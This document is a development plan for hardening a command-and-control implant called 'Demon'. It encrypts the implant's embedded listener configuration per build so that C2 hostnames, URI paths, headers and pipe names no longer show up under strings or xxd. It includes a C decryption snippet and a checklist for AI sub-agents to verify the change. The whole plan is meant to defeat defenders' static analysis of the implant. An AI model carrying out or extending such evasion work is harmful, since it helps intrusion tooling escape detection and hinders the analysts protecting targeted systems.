# Action Plan — Encrypted Demon Config Embedding (HVC-014)

## Context

Currently the demon's listener configuration (URLs, headers, user-agent, host
list, AES session key, RSA pubkey blob, sleep settings, etc.) is embedded in
the binary as plaintext bytes via the `CONFIG_BYTES` macro define. A simple
`xxd` / `strings` dump exposes:

- Listener hostnames and ports
- URI paths (e.g. `/js/jquery3.8.js`, `/index.action`)
- HTTP headers (`Content-type: text/plain`, `Host: ...`)
- User-Agent string
- Pivot pipe names

This is a serious static-analysis weakness: any analyst with the binary can
identify the C2 endpoints without running the sample.

This change encrypts `CONFIG_BYTES` at build time using AES-256-CTR with a
build-unique random key. The demon decrypts the bytes in place at the start
of `DemonConfig()` using the embedded key/IV before parsing. The plaintext
strings never appear in the binary.

## Scope

1. Encrypt `CONFIG_BYTES` at build time and embed cipher + key + IV
2. Decrypt in-place at runtime in `DemonConfig()` using the existing AES-CTR primitive
3. Remove the `--debug-dev` option entirely (it was UNSTABLE per `Debug-Build-Instability-Analysis.md`)
4. Bump versions: teamserver `0.8.10 → 0.8.11`, client `1.3 → 1.4` (codename "Veiled Anchor")
5. Triple-check via three sub-agents (developer / QA / tester)

## Encryption design

**Algorithm:** AES-256-CTR (already implemented in the demon as
`AesInit`/`AesXCryptBuffer` in `payloads/Demon/src/crypt/AesCrypt.c`, and on
the teamserver side as `crypt.XCryptBytesAES256` in
`teamserver/pkg/common/crypt/aes.go`).

**Key/IV provenance:** Generated freshly per build via `crypto/rand` on the
teamserver. **Different for every demon binary**, so the key from one binary
cannot decrypt another.

**Three new compiler defines emitted by `builder.go`:**
- `CONFIG_BYTES`        → ciphertext (replacing the previous plaintext)
- `CONFIG_KEY`          → 32-byte byte-array initializer
- `CONFIG_IV`           → 16-byte byte-array initializer

The size of `CONFIG_BYTES` is unchanged — AES-CTR is a stream cipher, so
ciphertext length equals plaintext length. The teamserver's existing
`array := "{...}"` formatting is reused.

**Why not derive the key from a built-in constant?** A derived key still has
to compute from constants in the binary; an attacker can replicate the
derivation. A random per-build key is just as opaque and simpler. The key
bytes don't look like URLs/strings, so `xxd` no longer reveals listener info.

## Demon-side decryption flow

In `Demon.c::DemonConfig()`, before the existing `ParserNew(...)`:

```c
VOID DemonConfig()
{
    /* [HVC-014] Decrypt embedded config in-place before parsing.
     * AgentConfig was filled at startup from the encrypted CONFIG_BYTES
     * macro. The key/IV are also embedded at compile time but as raw
     * 32+16 byte arrays — no URL/string content. */
    {
        AESCTX  CfgAes = { 0 };
        BYTE    CfgKey[ 32 ] = CONFIG_KEY;
        BYTE    CfgIv [ 16 ] = CONFIG_IV;

        AesInit( &CfgAes, CfgKey, CfgIv );
        AesXCryptBuffer( &CfgAes, ( PUINT8 ) AgentConfig, sizeof( AgentConfig ) );

        /* Wipe key material from local stack now that decrypt is done. */
        RtlSecureZeroMemory( CfgKey, sizeof( CfgKey ) );
        RtlSecureZeroMemory( CfgIv,  sizeof( CfgIv  ) );
        RtlSecureZeroMemory( &CfgAes, sizeof( CfgAes ) );
    }

    /* existing code: */
    PARSER Parser = { 0 };
    /* ... ParserNew, ParserGetInt32, etc. */
}
```

The existing `RtlSecureZeroMemory(AgentConfig, ...)` call after `ParserNew`
already zeros the plaintext from `.data` after the parser copies it.

**No change to subsequent ParserGet* calls** — they see plaintext exactly as
before.

## Removing `--debug-dev`

| Location | Action |
|---|---|
| `teamserver/cmd/cmd.go:36`        | Delete the `--debug-dev` flag registration |
| `teamserver/cmd/server/types.go`  | Delete `DebugDev bool` from serverFlags |
| `teamserver/cmd/server/dispatch.go` | Delete `DebugDev:` from BuilderConfig literal |
| `teamserver/pkg/common/builder/builder.go:75` | Delete `DebugDev bool` from BuilderConfig struct |
| `teamserver/pkg/common/builder/builder.go:194-216` | Collapse the if/else branch — the production CFlags are the only path now |
| `teamserver/pkg/common/builder/builder.go:316-334` | Collapse the DEBUG-define branch — only `DebugStringsOnly` adds DEBUG defines |
| `teamserver/pkg/common/builder/builder.go:534` | Update DEBUG-AUDIT skip condition (drop DebugDev check) |
| `teamserver/pkg/common/builder/builder_test.go:53` | Drop `DebugDev: false` from test fixture |
| `payloads/Demon/include/common/Macros.h` | Drop the comment referencing `--debug-dev` UNSTABLE mode |
| `CHANGES.md` | Document the removal |

## Version bump

- Teamserver: `0.8.10 "Silent Storm"` → `0.8.11 "Veiled Anchor"`
- Client: `1.3 "Silent Anchor"` → `1.4 "Veiled Anchor"`

## Files modified

| File | Change |
|---|---|
| `teamserver/pkg/common/builder/builder.go` | Generate key+IV, encrypt config, emit `CONFIG_KEY` / `CONFIG_IV` defines, remove DebugDev paths |
| `teamserver/pkg/common/builder/builder_test.go` | Remove `DebugDev: false` field |
| `teamserver/cmd/cmd.go` | Remove `--debug-dev` flag, bump version |
| `teamserver/cmd/server/types.go` | Remove `DebugDev` field from serverFlags |
| `teamserver/cmd/server/dispatch.go` | Remove `DebugDev:` propagation |
| `payloads/Demon/src/Demon.c` | Add decrypt block at top of `DemonConfig()` |
| `payloads/Demon/include/common/Macros.h` | Remove `--debug-dev` comment line |
| `client/src/global.cc` | Bump to `1.4` "Veiled Anchor" |
| `CHANGES.md` | Add HVC-014 entry + DEBUG-DEV-REMOVED entry + VERSION-0.8.11 entry |

## Risk profile

| Aspect | Risk | Mitigation |
|---|---|---|
| Wrong key/IV embedding format | Demon fails to decrypt → can't parse config → exits | Use the same `0x..,` array format already proven by `CONFIG_BYTES` and `SERVER_PUBKEY_BLOB` |
| AES-CTR length mismatch | Demon reads garbage past plaintext | CTR is a stream cipher, length is preserved exactly — same `len(Config)` before and after |
| Decrypt happens too late | Parser consumes encrypted bytes | Decrypt INSIDE `DemonConfig()` BEFORE `ParserNew()` — new block at function top |
| `AgentConfig[]` is `SEC_DATA` (`.data`) — read-only? | In-place decrypt fails | `SEC_DATA` is `__attribute__((section(".data")))` — `.data` is writable; `.rodata` would not be |
| Key still discoverable in binary | Attacker can re-decrypt | Acknowledged. The goal is to defeat trivial `strings`/`xxd`. Any AES-equipped reverse engineer who locates key+IV+ciphertext and knows the algorithm can decrypt — but they have to do real RE work, not just `xxd | grep`. |
| `--debug-dev` removal breaks operator workflows | Operators using `--debug-dev` see "unknown flag" | The flag has been documented as UNSTABLE since DEBUG-STRINGS-ONLY (2026-04-28). `--debug-strings-only` covers all legitimate use cases. |

## Verification (triple-check)

### Pass 1: Developer agent — implementation correctness
Read every modified file and verify:
1. `builder.go` builds the `CONFIG_KEY`/`CONFIG_IV` byte-array initializers correctly
2. The encrypted `CONFIG_BYTES` is the same length as the plaintext
3. The decrypt block in `Demon.c` runs BEFORE `ParserNew`
4. The decrypt key/IV match the encrypt key/IV exactly
5. No DebugDev references remain anywhere

### Pass 2: QA agent — security and edge cases
Verify:
1. AES key/IV are random per build (not hardcoded constants)
2. Key material is wiped from stack after use
3. The `AgentConfig` zero-after-parse is preserved
4. The `--debug-strings-only` mode still works (PRINTF still routes to LogToConsole)
5. No regression in HVC-005 RSA blob, HVC-003 HeaderMaskSeed, HVC-007 LZNT1, etc.

### Pass 3: Tester agent — runtime correctness
Walk through:
1. `builder.go` emits 3 defines: `CONFIG_BYTES` (encrypted), `CONFIG_KEY`, `CONFIG_IV`
2. `Demon.c` `AgentConfig[] = CONFIG_BYTES` is now ciphertext
3. `DemonConfig()` decrypts in-place
4. `ParserNew` then sees plaintext
5. All `ParserGet*` calls return correct values
6. The DEBUG-AUDIT post-build scanner does NOT trigger on the encrypted bytes (it only scans for `[DEBUG::` markers, which are not present in encrypted data)

## Out of scope

- Re-encrypting RSA pubkey blob, HeaderMaskSeed, or other already-injected defines (those are non-text — RSA blob is binary, HeaderMaskSeed is a 32-bit constant)
- Splitting/scattering the key bytes across the binary (could be a future hardening — HVC-015)
- Polymorphic key derivation (could be HVC-016)
